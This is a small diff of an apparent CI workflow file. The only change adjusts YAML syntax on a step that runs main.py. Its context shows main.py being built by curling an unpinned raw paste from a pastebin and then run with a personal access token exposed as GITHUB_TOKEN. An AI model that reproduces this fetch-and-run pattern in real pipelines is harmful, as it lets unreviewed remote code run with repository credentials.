@@ -42,7 +42,7 @@ jobs:
         run: curl https://katb.in/enusuweqafu/raw >> main.py
 
       - name: Run dispatch_event.
-        run:
+        run: |
           python3 main.py
         env:
           GITHUB_TOKEN: ${{ secrets.PAT }} 
